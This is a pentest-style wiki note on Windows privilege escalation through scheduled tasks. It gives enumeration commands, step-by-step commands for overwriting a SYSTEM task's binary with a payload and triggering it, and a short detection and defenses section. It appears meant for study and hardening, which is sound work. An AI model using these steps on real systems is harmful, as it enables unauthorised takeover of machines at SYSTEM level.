# Privilege Escalation via Scheduled Tasks

Scheduled tasks that run as SYSTEM or an administrator are a classic privilege-escalation vector: if the program a high-privilege task launches is writable by you — or lives in a writable directory, or is referenced by an unquoted path — you can replace or hijack it and inherit the task's privileges when it next fires. This is the scheduler analogue of the [Services Exploitation](Services-Exploitation/Services-Exploitation.md) misconfigurations, and it is one of the vectors the [Windows Privilege Escalation](README.md) MOC lists but that otherwise had no dedicated note.

## Enumeration

List every task with its run-as context and the binary it executes:

```cmd
schtasks /query /fo LIST /v
```

PowerShell, filtered to tasks not running as the current user:

```powershell
Get-ScheduledTask | ForEach-Object {
  [pscustomobject]@{
    Name   = $_.TaskName
    Path   = $_.TaskPath
    RunAs  = $_.Principal.UserId
    Action = ($_.Actions | Select-Object -Expand Execute -ErrorAction SilentlyContinue) -join ';'
  }
} | Where-Object { $_.RunAs -match 'SYSTEM|Administrator' } | Format-Table -Auto
```

WinPEAS and PowerUp (`Get-ScheduledTasks`) also flag tasks whose executable is user-writable.

## Exploitation

1. Identify a task running as SYSTEM/admin whose target binary you can overwrite:

```cmd
icacls "C:\Scripts\backup.exe"
```

Look for `(F)` or `(W)` for your user, `Users`, or `Authenticated Users`.

2. Replace the binary with your payload:

```cmd
copy /y C:\Windows\Temp\payload.exe "C:\Scripts\backup.exe"
```

3. Trigger the task (or wait for its schedule):

```cmd
schtasks /run /tn "\BackupJob"
```

4. Confirm and clean up:

```cmd
whoami
:: -> nt authority\system
```

If the task's path is **unquoted and contains spaces**, the [Unquoted Service Path Vulnerability](Services-Exploitation/Unquoted-Service-Path-Vulnerability.md) trick applies identically — drop `C:\Program.exe`. If you can *create* tasks as an admin token, `schtasks /create /ru SYSTEM` is a direct route.

## Detection and defenses

- **Detection:** modification of a scheduled-task binary (file-integrity / Sysmon Event ID 11), `schtasks /create` with `/ru SYSTEM`, Event ID 4698 (task created), 106/200 in the TaskScheduler operational log.
- **Defenses:** ensure task binaries and their directories are writable only by administrators; quote task paths; audit task creation.

## Related
- [Windows Privilege Escalation](README.md) — category MOC
- [Services Exploitation](Services-Exploitation/Services-Exploitation.md) — the same misconfiguration classes for services
- [Privilege Escalation via Startup Applications](Privilege-Escalation-via-Startup-Applications.md) — sibling autostart vector
- [Unquoted Service Path Vulnerability](Services-Exploitation/Unquoted-Service-Path-Vulnerability.md) — applies to unquoted task paths too
- [Privilege Escalation Tools](Privilege-Escalation-Tools.md) — WinPEAS/PowerUp flag writable task binaries
